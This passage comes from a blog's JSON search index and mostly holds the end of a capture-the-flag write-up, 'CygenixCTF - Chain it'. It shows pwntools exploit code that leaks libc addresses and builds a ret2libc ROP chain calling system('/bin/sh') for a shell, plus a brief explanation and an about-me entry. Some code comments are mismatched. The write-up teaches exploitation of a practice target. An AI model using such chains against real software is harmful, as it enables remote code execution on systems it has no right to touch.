gets_leak}, select_index=1) libc = ELF(libc_filename) libc.address = puts_leak - libc.sym['puts'] #system system = libc.sym['system'] bin_sh = next(libc.search(b'/bin/sh\\x00')) # Final exploit payload = flat( b'A' * offset, # Overflow buffer and overwrite RBP ret_addr, pop_rdi, # Overwrite return address with win() function address bin_sh, # Overwrite return address with win() function address system, ) p.sendline(payload) p.interactive() ","date":"2024-08-26","objectID":"/chainit/:0:0","tags":["PWN","CygenixCTF"],"title":"CygenixCTF - Chain it","uri":"/chainit/"},{"categories":["Writeups"],"content":"Explanation Leak puts and gets using buffer overflow + pop rdi and ret -\u003e getting the right libc with this new info -\u003e remote shell ","date":"2024-08-26","objectID":"/chainit/:1:0","tags":["PWN","CygenixCTF"],"title":"CygenixCTF - Chain it","uri":"/chainit/"},{"categories":null,"content":"About Me","date":"0001-01-01","objectID":"/aboutme/","tags":null,"title":"About Me","uri":"/aboutme/"},{"categories":null,"content":"Background Information I like computers 🤓❗ ","date":"0001-01-01","objectID":"/aboutme/:0:0","tags":null,"title":"About Me","uri":"/aboutme/"}]